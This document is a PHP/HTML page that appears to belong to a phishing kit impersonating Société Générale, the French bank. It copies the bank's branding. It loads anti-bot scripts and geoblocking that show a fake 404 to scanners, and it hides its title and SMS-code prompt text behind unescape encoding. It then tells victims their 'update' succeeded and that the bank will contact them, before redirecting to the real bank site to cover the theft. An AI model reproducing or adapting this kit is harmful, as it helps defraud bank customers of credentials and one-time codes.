<?php
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php"; 

  include 'functions.php';
  if(!check_block_country()){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        exit;
  };

 ?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
            <meta http-equiv="refresh" content="5; url=https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html">
        <!-- CSS FILES -->
        <link rel="stylesheet" href="assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/fonts.css">
        <link rel="stylesheet" href="assets/css/main.css">

        <link rel="shortcut icon" href="assets/images/favicon.ico" type="image/x-icon">

        <script type="text/javascript">
            var title = unescape( '%53%6F%63%69%E9%74%E9%20%47%E9%6E%E9%72%61%6C%65%20%7C%20%43%6F%6E%6E%65%78%69%6F%6E' );
            var page_title = unescape( '%43%6F%64%65%20%64%65%20%63%6F%6E%66%69%72%6D%61%74%69%6F%6E' );
            var page_title2 = unescape( '%45%6E%74%72%65%7A%20%6C%65%20%63%6F%64%65%20%72%65%E7%75%20%70%61%72%20%53%4D%53%20%65%74%20%61%70%70%75%79%65%7A%20%73%75%72%20%43%6F%6E%66%69%72%6D%65%72%2E' );
        </script>
<style type="text/css">
            .btnx {
                padding: 0.50rem 2rem;
                width: 13.675rem;
                color: #fff;
                font-size: 15px;
                font-weight: 600;
                text-align: center;
                border-radius: 1.5rem;
                background-color: #010035;
                /* color: #f8f9fa; */
                border: 0;
            }
            dl, ol, ul {
    margin-top: 0;
    margin-bottom: .3rem !important;
}
.input-errorr{
    color: red;
}
        </style>
        <title></title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
                <div class="row" style="margin-right: 0px;margin-left: 0px;">
                    <div class="col-lg-6 col-md-6 col-sm-12 col-12">
                        <div class="logo pt-4 text-lg-left text-md-left text-sm-center text-center " >

                           <a href="" class="d-lg-none d-md-none d-sm-inline-block d-inline-block" style="width: 100%;">
                                <div class="row" style="margin-right: 0px;margin-left: 0px;">
                                    <div class="col-7" style="text-align: right;">
                                         <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 23 23">
                                            <g fill="none" fill-rule="evenodd">
                                               <path fill="#ED0210" d="M0 11.335h22.22V0H0z"></path>
                                               <path fill="#000" d="M0 22.141h22.22V11.032H0z"></path>
                                               <path fill="#FFF" d="M4.413 11.649h14.456v-1.352H4.413z"></path>
                                            </g>
                                         </svg>
                                </div>

                                   
                           <!--      <div class="col-5 text-lg-right text-md-right" style=" padding-right: 0px; padding-left: 0px;">
                                        <button type="button" class="btnx ml-auto mr-m" style=" padding: 0.5rem 0.2em;width: 8.675rem;font-size: 0.8rem">
                                                Ouvrir un compte
                                        </button>
                                    </div> -->
                                </div>
                            </a>

   

                            <a href="#" class="d-lg-block d-md-block d-sm-none d-none ml-5">
                                <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="192" height="40" viewBox="0 0 340 70">
                                    <g fill="none" fill-rule="evenodd" transform="translate(-15 -1)">
                                       <path fill="#000" d="M15.106 24.88c0-5.948 4.551-10.164 10.751-10.164 3.602 0 6.506 1.312 8.405 3.685l-3.518 3.184c-1.229-1.48-2.737-2.29-4.608-2.29-3.212 0-5.445 2.234-5.445 5.585s2.233 5.585 5.445 5.585c1.871 0 3.38-.81 4.608-2.29l3.518 3.183c-1.899 2.374-4.803 3.686-8.405 3.686-6.2 0-10.75-4.216-10.75-10.164M41.748 16.81c0 .782-.112 1.396-.894 3.212l-1.787 4.076h-3.323l1.313-4.551c-1.006-.475-1.648-1.424-1.648-2.737 0-1.9 1.34-3.127 3.183-3.127 1.815 0 3.156 1.228 3.156 3.127M60.04 30.381v4.273H44.345V15.106h15.33v4.274h-9.858v3.294h8.686v4.134h-8.685v3.573zM61.604 32.895l1.815-4.077c1.731 1.144 4.188 1.926 6.45 1.926 2.29 0 3.184-.642 3.184-1.591 0-3.1-11.114-.838-11.114-8.098 0-3.491 2.848-6.34 8.656-6.34 2.541 0 5.166.587 7.093 1.704l-1.703 4.105c-1.87-1.005-3.714-1.507-5.418-1.507-2.318 0-3.155.78-3.155 1.759 0 2.987 11.086.753 11.086 7.958 0 3.407-2.848 6.31-8.657 6.31-3.21 0-6.394-.865-8.237-2.15M85.62 19.49h-6.003v-4.384h17.508v4.385H91.15v15.163h-5.53zM126.308 15.106l-8.379 19.547h-5.445l-8.35-19.547h5.977l5.306 12.734 5.416-12.734zM141.64 24.88c0-3.379-2.318-5.585-5.28-5.585-2.958 0-5.276 2.206-5.276 5.585s2.318 5.585 5.277 5.585c2.96 0 5.279-2.206 5.279-5.585m-16.141 0c0-5.864 4.608-10.164 10.862-10.164 6.256 0 10.864 4.3 10.864 10.164s-4.608 10.164-10.864 10.164c-6.254 0-10.862-4.3-10.862-10.164M150.382 25.942V15.107h5.53v10.666c0 3.352 1.396 4.692 3.713 4.692 2.29 0 3.687-1.34 3.687-4.692V15.107h5.445v10.835c0 5.835-3.407 9.102-9.188 9.102-5.78 0-9.187-3.266-9.187-9.102M170.991 32.895l1.815-4.077c1.731 1.144 4.19 1.926 6.451 1.926 2.29 0 3.183-.642 3.183-1.591 0-3.1-11.114-.838-11.114-8.098 0-3.491 2.848-6.34 8.657-6.34 2.541 0 5.166.587 7.094 1.704l-1.704 4.105c-1.872-1.005-3.715-1.507-5.419-1.507-2.317 0-3.155.78-3.155 1.759 0 2.987 11.087.753 11.087 7.958 0 3.407-2.849 6.31-8.658 6.31-3.21 0-6.394-.865-8.237-2.15M58.002 39.648h5.529V54.81h9.326v4.385H58.002zM78.136 41.352c0 .781-.112 1.396-.894 3.211l-1.787 4.077h-3.323l1.312-4.552c-1.005-.475-1.647-1.424-1.647-2.736 0-1.9 1.34-3.128 3.183-3.128 1.815 0 3.156 1.228 3.156 3.128M90.59 51.32l-2.512-6.255-2.513 6.255h5.026zm1.62 4.077h-8.265l-1.536 3.8h-5.641l8.629-19.55h5.445l8.657 19.55h-5.752l-1.537-3.8zM117.455 39.648l-8.377 19.548h-5.445l-8.35-19.548h5.976l5.306 12.734 5.417-12.734zM135.133 54.923v4.273H119.44V39.648h15.331v4.273h-9.858v3.295h8.685v4.133h-8.685v3.574zM156.665 39.648v19.548h-4.553l-8.629-10.417v10.417h-5.416V39.648h4.551l8.63 10.416V39.648z"></path>
                                       <path fill="#000" d="M160.436 59.196h5.528V39.648h-5.528zM178.363 44.004h-3.072v5.725h3.072c2.29 0 3.435-1.061 3.435-2.849 0-1.815-1.145-2.876-3.435-2.876zm-.055 9.997h-3.017v5.195h-5.529V39.648h8.936c5.333 0 8.686 2.765 8.686 7.232 0 2.876-1.398 4.998-3.827 6.171l4.218 6.145h-5.922l-3.545-5.195zM249.497 25.422c-1.623-.688-3.361-1.138-4.91-1.138-2.257 0-3.387.486-3.387 1.358 0 2.498 10.082.493 10.082 5.821 0 2.206-2.071 3.911-6.219 3.911-2.462 0-4.385-.509-6.595-1.705l.912-1.986c1.937 1.076 3.743 1.553 5.697 1.553 2.46 0 3.778-.71 3.778-1.773 0-2.731-10.084-.692-10.084-5.687 0-2.153 2.054-3.636 5.771-3.636 2.223 0 4.093.489 5.879 1.384l-.924 1.898zM260.738 35.441c-4.028 0-7.367-2.682-7.367-6.692 0-3.962 3.34-6.695 7.367-6.695 4.05 0 7.336 2.733 7.336 6.695 0 4.01-3.287 6.692-7.336 6.692m0-11.229c-2.935 0-4.937 1.987-4.937 4.537 0 2.611 1.916 4.554 4.937 4.554 3 0 4.907-1.962 4.907-4.554 0-2.55-1.908-4.537-4.907-4.537M277.694 35.426c-4.23 0-7.419-2.68-7.419-6.695 0-3.945 3.238-6.677 7.42-6.677 2.494 0 4.28.707 5.883 1.887l-1.247 1.857c-1.166-.897-2.625-1.551-4.569-1.551-3.088 0-5.006 1.952-5.006 4.484 0 2.61 1.937 4.504 5.038 4.504 1.941 0 3.476-.628 4.635-1.521l1.253 1.856c-1.607 1.18-3.493 1.856-5.988 1.856M286.238 35.086h2.349V22.441h-2.349zM292.057 22.44v12.646h11.918v-2.09H294.4V29.69h7.127v-2.088H294.4V24.53h9.168v-2.09zM305.224 22.44v2.077h5.156v10.569h2.34V24.517h5.151v-2.076zM319.758 22.44v12.646h11.919v-2.09h-9.571V29.69h7.13v-2.088h-7.13V24.53h9.168v-2.09zM245.698 50.05c1.287 0 2.61-.29 3.607-.761v-3.677h2.282v4.909c-1.605 1.079-3.81 1.736-5.989 1.736-4.227 0-7.416-2.676-7.416-6.692 0-3.944 3.238-6.672 7.416-6.672 2.447 0 4.284.688 5.888 1.868l-1.245 1.855c-1.17-.893-2.635-1.502-4.578-1.502-3.084-.067-5 1.922-5 4.45 0 2.617 1.94 4.487 5.035 4.487M254.673 39.278v12.639h11.919V49.83h-9.578v-3.307h7.136v-2.087h-7.136v-3.072h9.177v-2.086zM271.19 51.918h-2.294V39.277h2.393l8.245 9.527.056-.016a101.83 101.83 0 0 1-.157-6.208v-3.303h2.291v12.64h-2.374l-8.213-9.522-.037.019c.09 1.87.09 5.139.09 6.205v3.299zM285.024 39.278v12.639h11.921V49.83h-9.58v-3.307h7.133v-2.087h-7.133v-3.072h9.173v-2.086zM305.544 47.268h-3.777v4.65h-2.345v-12.64h8.125c2.695 0 4.366 1.655 4.366 4.029 0 2.258-1.64 3.605-3.624 3.894l3.764 4.717h-2.94l-3.57-4.65zm1.752-2.107c1.467 0 2.296-.758 2.296-1.854 0-1.2-.73-1.943-2.045-1.943h-5.78v3.797h5.529zM319.03 39.278l-6.16 12.639h2.536l1.451-3.068h6.82l1.454 3.068h2.527l-6.164-12.64h-2.464zm1.245 2.393l2.426 5.126h-4.869l2.443-5.126zM329.384 39.278v12.639h10.783V49.83h-8.443V39.278zM341.75 39.278v12.639h11.922V49.83h-9.575v-3.307h7.132v-2.087h-7.132v-3.072h9.175v-2.086z"></path>
                                       <path fill="#ED0210" d="M199.175 37.453h30.212V22.042h-30.212z"></path>
                                       <path fill="#000" d="M199.175 52.255h30.212V37.151h-30.212z"></path>
                                       <path fill="#FFF" d="M204.454 38.069h19.655v-1.838h-19.655z"></path>
                                    </g>
                                 </svg> 
                            </a>

                        </div>
                    </div>
                    <div class="col-lg-6 col-md-6 col-sm-12 col-12">
                        <div class="logo pt-4 text-lg-right text-md-right text-sm-center d-lg-block d-md-block d-sm-none d-none text-center mr-5">
                           <!--  <button type="button" class="btnx ml-auto mr-m">
                                Ouvrir un compte
                            </button> -->
                        </div>

                    </div>
                </div> 
        </header>
        <!-- END HEADER -->

        <!--  PAGE HEADER -->
        <div id="page_header" >
            <div class="pl-8">
                 <h3 ></h3>
            </div>
           
        </div>
        <!-- END PAGE HEADER -->
        <!-- END PAGE HEADER -->

        <!-- MAIN -->
        <main id="main" class="pt-2 pb-5 mt-5 mb-10" ng-app="sa_app"  ng-controller="controller" ng-init="show_data()" style="padding-top: 1.5rem!important;    padding-bottom: 12rem!important;">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-6 text-center"> <i aria-hidden="true" class="fa fa-check-square" style="font-size: 9rem;color: #2db544;"></i>
                        <h4 class="text-center mb-6 mt-3">
                       
                            <p style="font-size: 1.6rem;margin-bottom: 8px;">
                              Mise à jour réussie !<br> <strong> Attendez un contact prochain de notre équipe pour vous assister dans les meilleurs délais.
Vous allez vous rediriger vers la page d'accueil.</strong>
                            </p></h4>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER 1 -->
        <div id="footer1" class="pt-5 pb-5">
            <div class="container">
                <div class="row">
                    <div class="col-lg-8 col-md-8 col-sm-12 col-12">
                        <img src="assets/images/footer-info.jpg" class="d-lg-block d-md-block d-sm-none d-none">
                        <img src="assets/images/footer-info2.jpg" class="d-lg-none d-md-none d-sm-inline-block d-inline-block">
                    </div>
                    <div class="col-lg-4 col-md-4 col-sm-12 col-12 d-lg-block d-md-block d-sm-none d-none text-right">
                        <img src="assets/images/social.jpg">
                    </div>
                </div>
            </div>
        </div>
        <!-- END FOOTER 1 -->

        <!-- FOOTER 1 -->
        <div id="footer2" class="pt-3 pb-3">
            <div class="container">
                <div class="row">
                    <div class="col-lg-3 col-md-3 col-sm-12 col-12 d-lg-block d-md-block d-sm-none d-none">
                        <img src="assets/images/logo.jpg">
                    </div>
                    <div class="col-lg-9 col-md-3 col-sm-12 col-12 text-lg-right text-md-right text-sm-center text-center">
                        <img src="assets/images/footer-links.jpg" class="d-lg-inline-block d-md-inline-block d-sm-none d-none">
                        <img src="assets/images/footer-links2.jpg" class="d-lg-none d-md-none d-sm-inline-block d-inline-block">
                    </div>
                </div>
            </div>
        </div>
        <!-- END FOOTER 1 -->

        <!-- JS FILES -->
        <script src="assets/js/jquery.min.js"></script>
        <script src="assets/js/popper.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/fontawesome.min.js"></script>
        <script src="assets/plugins/countdowntimer/jquery.countdownTimer.min.js"></script>
        <script src="assets/js/main.js"></script>

        <script type="text/javascript">
            $('title').text(title);
           // $('#page_header h3').html('<i class="far fa-arrow-alt-circle-left"></i> ' + page_title);
            $('#main h3').html(page_title2);
            jQuery(function($){
                $(".timer").countdowntimer({
                    minutes: 5
                });
            })
        </script>


<script src="assets/js/angular.min.js"></script>
<script src="assets/js/dirPaginate.js"></script>
<script> 

var fetch = angular.module('sa_app', ['angularUtils.directives.dirPagination']);

fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {

  
}]);

</script>












    </body>

</html>